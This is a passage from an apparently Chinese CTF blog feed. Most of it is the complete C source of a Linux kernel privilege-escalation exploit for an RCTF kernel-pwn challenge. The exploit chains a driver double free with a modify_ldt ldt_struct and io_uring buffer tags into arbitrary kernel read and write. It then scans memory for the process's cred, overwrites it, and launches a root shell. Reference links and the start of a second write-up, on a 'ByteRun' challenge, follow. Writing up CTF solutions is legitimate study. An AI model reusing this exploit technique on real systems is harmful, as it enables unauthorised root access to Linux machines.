class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>, <span class="title">ring1</span>, <span class="title">ring2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> entries;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_entries;</span><br><span class="line">    <span class="keyword">int</span> slot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_uring</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring1, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> *data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[<span class="title">num</span>];</span></span><br><span class="line">    <span class="keyword">size_t</span> tags[num];</span><br><span class="line">    <span class="built_in">memcpy</span>(tags, data, num * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vecs[i].iov_base = tmp_buf;</span><br><span class="line">        vecs[i].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = io_uring_register_buffers_tags(ring, vecs, tags, num);</span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>, res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> Data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[2];</span></span><br><span class="line">    vecs[<span class="number">0</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">0</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="number">0</span>, vecs, Data, num);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>, ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    signal(SIGINT, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> *result;</span><br><span class="line">    <span class="keyword">uint64_t</span> cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed open /dev/game&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] construct double free! \033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init_uring();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, buf);</span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=aaaaaaaaa&quot;</span>); <span class="comment">// context-&gt;cur[0] = object(0x10);</span></span><br><span class="line">    read(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap_addr : \033[0m %p\n&quot;</span>, heap_addr);</span><br><span class="line">    ioctl(fd, <span class="number">1</span>, buf);                 <span class="comment">// context-&gt;prv[0] = object(0x10);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=bbbbbbbbb&quot;</span>); <span class="comment">// kfree(context-&gt;cur[0]);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc)); <span class="comment">// context-&gt;prev[0] = object(0x10) == ldt_struct;</span></span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x16</span>, buf); <span class="comment">// double free     kfree(object(ldt_struct));</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] search cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    register_tag(&amp;ring, buf, <span class="number">2</span>);</span><br><span class="line">    search_addr = heap_addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr - i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; i % <span class="number">0x200</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] looked up range from \033[0m %p ~ %p\n&quot;</span>, search_addr - i * <span class="number">0x1000</span>, search_addr + i * <span class="number">0x1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr - (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr + i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr + (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] write cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff1000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">4</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    register_tag(&amp;ring1, buf, (<span class="number">0x1000</span> / <span class="number">8</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = real_cred + <span class="number">4</span> + <span class="number">8</span> * i;</span><br><span class="line">        update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">        read(fd, info, <span class="number">9</span>);</span><br><span class="line">        update_tag(&amp;ring1, buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = search_addr + <span class="number">0x3000000</span>;</span><br><span class="line">    update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] write Done \033[0m&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230420164729825.png"                      alt="image-20230420164729825"                ></p><hr><p>参考链接:</p><p>​    <a class="link"   href="https://blog.rois.io/2022/rctf-2022-official-write-up/" >https://blog.rois.io/2022/rctf-2022-official-write-up/<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v6.0.12/source" >https://elixir.bootlin.com/linux/v6.0.12/source<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896" >https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896<i class="fas fa-external-link-alt"></i></a></p><p>题目链接:</p><p>​    XCTF中可以下载</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="modify_ldt" scheme="https://cv196082.gitee.io/tags/modify-ldt/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
  </entry>
  
  <entry>
    <title>ByteRun复现</title>
    <link href="https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-01T07:05:48.000Z</published>
    <updated>2023-04-01T07:05:25.085Z</updated>
    
    <content type="html"><![CDATA[<p>当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。</p><h2 id="内核分析"><a href="#内核分析" class="headerlink" title="内核分析"></a>内核分析</h2><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><del>这道题目要说难也算难，要说简单那就是说屁话</del>。这道题可以说是从逆向就开始变得不对劲起来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">bytedev_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// r14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> 